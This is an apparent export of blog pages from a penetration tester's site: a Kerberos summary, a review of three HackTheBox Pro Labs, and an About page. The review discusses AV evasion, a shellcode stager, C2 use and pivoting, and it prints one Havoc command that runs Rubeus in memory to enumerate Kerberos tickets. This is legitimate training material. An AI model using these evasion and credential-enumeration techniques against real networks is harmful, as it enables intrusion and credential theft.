Default authentication mechanism in Windows since Windows 2000 and built into macOS, Red Hat and other Linux distributions Knowledge based authentication only ⇒ weak passwords lead to easy compromise Both ends of the communication chain must be authenticated Misconfiguration can lead to tickets being active for a long time If properly configured, tickets are only viable for a limited amount of time Time-synchronization between KDC and all clients is necessary for the system to function properly The protocol is open source and based on open internet standards Client-side storage of tickets in memory is unsafe, since tickets can be dumped with tools like mimikatz and reused by other users Must-watch videos about the topic:\nhttps://www.youtube.com/watch?v=5N242XcKAsM\nhttps://www.youtube.com/watch?v=qW361k3-BtU\nhttps://www.youtube.com/watch?v=snGeZlDQL2Q\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.crowdstrike.com/cybersecurity-101/kerberoasting/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"http://localhost:1313/blog/kerberos/","title":"Kerberos Authentication Protocol"},{"content":"During the summer months of July and August of 2023 I had the opportunity to complete three of the six buyable HackTheBox Pro Lab certifications: Offshore, a Penetration Tester Level 3 lab, as well as RastaLabs and Zephyr, both of which are Red Team Operator Level 1 certifications respectively.\nIn this blog post I want to outline my experiences, struggles and learning outcomes of these labs and provide my personal opinion on them.\nThese networks greatly improved my understanding of Active Directory infrastructure, enumeration and exploitation. While I will roughly explain the topics and attack vectors covered in each lab in the following paragraphs, this blog is in no way intended to serve as a walkthrough and will not go into detail regarding the exploitation steps in order to protect the integrity of the certifications.\nWhat are HackTheBox Pro Labs?\rHackTheBox is one of the leading companies in the field of cyber security training and certification. They offer a wide variety of free and paid services, including free penetration testing training machines that can be used to hone enumeration and exploitation skills on Linux or Windows targets. In addition to these standalone boxes, the platform also provides paid access to the so-called HackTheBox Pro Labs for advanced training purposes. Pro Labs are immersive Active Directory networks that are designed to simulate real-world environments and consist of multiple machines that are connected to each other. The overall goal of each lab is to obtain Domain Admin privileges on the entire network and collect all flags along the way that are then submitted as a proof of compromise. While some flags are necessary to progress through the lab, others are acquired by completing additional exploitation on standalone domains or machines in the network. After completion, a certificate is issued that can be used to prove the holder\u0026rsquo;s skills and knowledge in the field of penetration testing Active Directory environments and red team tactics.\nThe Pro Lab service is subscription paid: For 40€ per month, a buyer gets access to all 6 networks with difficulties ranging from suiting beginner penetration testers to APT-level red team operators. The labs can be completed via VPN access in any order and at any time, as long as the subscription is active.\nOffshore: Trust Terror\rStarting a week into July, the Offshore lab was the first network I tackled. This Penetration Tester Level 3 lab consists of 21 machines with a total of 38 flags to be collected along the journey. With an environment that big, it was no surprise that the Offshore lab took me the longest to complete. Without taking away too much from the attack vectors and topics covered in the lab, Offshore focuses primarily on conventional penetration testing, which includes exploiting CVEs, credential gathering and common Active Directory misconfigurations. Where I took away the most from the lab was the enumeration and exploitation of domain and forest trusts. Due to the sheer size of the network, the Offshore network was divided into multiple domains with different trust relationships between them. It was more often than not necessary to obtain Domain Admin privileges on one domain in order to access the next one. Visualizing the landscape with tools like BloodHound was absolutely crucial for finding the necessary attack vectors to progress.\nFor auditing a network of this scale, simple reverse shell handlers are simply not enough to keep track of all the machines and their respective shells. It demands for a more advanced approach, using a Command \u0026amp; Control framework. The C2-Matrix provides a great overview of the most popular frameworks and their respective features, like Metasploit or the infamous Cobalt Strike. I personally fell in love with the Havoc framework, due to its beautiful user interface, open source code and uncanny similarity to the commercial Cobalt Strike. Havoc manages sessions that are created by executing agents (so-called demons) on the target machines and allows the user to use a variety of commands and modules to interact with the victim hosts.\nIt was also in this lab when I learned the importance of pivoting. For those unaware, pivoting is the process of using a compromised machine to attack other machines in the network. This is especially useful when the compromised machine is not directly accessible from the attacker\u0026rsquo;s machine. While I initially attempted to pivot using a socks proxy on the target machine and proxychains on the attacker box, this turned out to be very inefficient and resulted in the incredible long runtime of scans and commands. Luckily, I came across the fantastic ligolo-ng tool, which instead uses a TCP tunnel to forward traffic from the target machine to the attacker\u0026rsquo;s machine. This greatly improved the speed of scans and commands and made the lab a lot more enjoyable. It also proved to be very useful for the subsequent labs, since those are heavily reliant on pivoting as well.\nOverall, I absolutely enjoyed the Offshore lab. It was a great introduction to the Pro Labs and provided a lot of knowledge that I could apply to the subsequent labs. However, some flags where hidden in very specific places and required a lot of enumeration to find, which was slightly annoying, especially since I had already compromised the entire forest and but still had to go back to the side quests to obtain the certificates. The intention behind that is obviously to teach new techniques and encourage the user to enumerate more, but I personally found it slightly annoying at the end.\nRastaLabs: Evasion Madness\rI started RastaLabs, the first Red Team Operator lab in the series directly after finishing Offshore. In contrast to the aforementioned, RastaLabs only contains 15 machines and requires 22 flags to be submitted. RastaLabs is heavily oriented towards red teaming and focuses on the evasion of detection mechanisms. This includes the evasion of anti-virus software, network traffic monitoring and bypassing other endpoint restrictions like AppLocker. This proved to be rather challenging, since I had never dealt with AV evasion of this scale before. It in turn provided a great learning experience and motivated me to dive deeper into malware development and evading detection mechanisms and lead me to create a simple shellcode stager using Nim which I used to execute my Havoc demons in-memory. Since RastaLabs is a Red Team lab, it included the exploitation of interactive users via malicious phishing emails and a lot of interesting credential harvesting techniques, like exploiting a KeePass password database.\nOf course I also discovered numerous new Active Directory and Kerberos exploitation techniques, as well as other attacks that I found incredibly interesting. At this point I want to mention two resources that helped me a lot during the labs: HackTricks and ired.team. Both of these sources provide valuable information on penetration testing tools, privilege escalation, Active Directory exploitation and much more. I can highly recommend them to anyone who is interested in learning more about these topics.\nWhat made RastaLabs challenging was the fact that I had to reconfigure and adapt my tools due to the presence of the anti-virus software on the target hosts and firewall rules that blocked certain ports. The later was especially crucial since ligolo-ng uses an uncommon high port for it\u0026rsquo;s TCP tunnel, so I had to change it in order to pivot through the network. Havoc\u0026rsquo;s dotnet module was also very useful for executing .NET assemblies on the target machines in-memory without having to upload a binary to the target machine and evading detection by the anti-virus at the same time. As an example, the following command executes Rubeus in-memory on the target machine with the triage command to enumerate Kerberos tickets on the machine.\ndotnet inline-execute /opt/win-binaries/Rubeus.exe triage I really enjoyed RastaLabs because it taught me a lot of new techniques and procedures. Since I was already familiar with my toolset from the previous lab, I was able to progress through the lab a lot faster and complete it after roughly 10 days. Again, my only complaint is that some flags were hidden in very strange and specific places and required a lot of enumeration and support to find. I also want to give a heads-up to anyone who is interested in starting RastaLabs: Use multiple different password lists for brute-forcing or cracking and consider creating your own, it will save you a lot of time.\nZephyr: Pivoting Nightmare\rAfter the quick and successful completion of RastaLabs, I was highly motivated to attack the Zephyr Pro Lab. This Red Team Operator Level 1 lab consists of 17 machines and 17 flags and to me seemed like a combination of Offshore and RastaLabs. From Offshore, it inherited the cross-domain and forest trust attacks while it also featured interactive users and defense evasion like RastaLabs, but to a lesser extent. What was very different to the previous networks is that no machine in the Zephyr lab allowed RDP access, meaning I had to rely purely on Havoc und evil-winrm for remote access and post-exploitation. In addition to that, my good friend ligolo-ng came in handy again for pivoting through the network, where some hosts where pretty tricky to reach.\nZephyr covered a variety of Active Directory misconfiguration relating to ACL abuse and group memberships, as well as very interesting MSSQL Server attacks. It also featured CVEs that I had not heard of before, which was a great opportunity to learn about new exploits and how to use them. It also proved to be beneficial to improve my enumeration and local privilege escalation skills.\nAt this point, I was already very familiar with the Active Directory penetration testing process and knew what to look for when I encountered different AD ACLs or configurations. I had also become very comfortable with Havoc, Bloodhound, Rubeus, mimikatz and loads of other tools I consistently used during the labs. Like RastaLabs, Zephyr took me roughly 10 days to finish and thus completed my summer of Pro Labs. While for this lab, the flags very not as hidden as in the previous labs, I had some issues with pivoting to certain machines, which was very frustrating at times and it seemed to me like the lab was significantly less stable than the previous ones.\nConclusion\rHackTheBox\u0026rsquo;s Offshore, RastaLabs and Zephyr undoubtedly took my understanding of Active Directory infrastructure, configuration and exploitation to another level. I have learned by far the most during these labs and I am very happy to have been able to complete them. I can highly recommend them to anyone who is interested in improving their Active Directory skillset as well as anyone who wants to discover new adversarial techniques and procedures. This is however not the end! I am looking forward to completing the remaining three Pro Labs, especially the advanced Cybernetics and APT Labs networks and will write a follow-up blog post once I have finished them as well.\n","permalink":"http://localhost:1313/blog/offshore-rastalabs-zephyr/","title":"Intermediary-Level Red Team Training: Offshore, RastaLabs \u0026 Zephyr Review"},{"content":"\rHello, I\u0026rsquo;m Jakob\u0026hellip;\r\u0026hellip;and I\u0026rsquo;m a information security master\u0026rsquo;s student and penetration tester based in Austria. Currently, I am particularly interested in network penetration testing, especially Active Directory environments and am currently studying Windows 64-bit malware development. This site is to be used as a platform to document my journey in the field of information security and to write about my research and projects.\nSocials\rGitHub\rLinkedIn\rX\rHack The Box\rTryHackMe\rCertifications\rOSEP - OffSec OSCP - OffSec OSWP - OffSec CRTO - Zero-Point Security Malware Development - MalDev Academy APTLabs - HackTheBox Cybernetics - HackTheBox Alchemy - HackTheBox Offshore - HackTheBox RastaLabs - HackTheBox Zephyr - HackTheBox Dante - HackTheBox PWST - TCM Security ","permalink":"http://localhost:1313/about/","title":"About"}]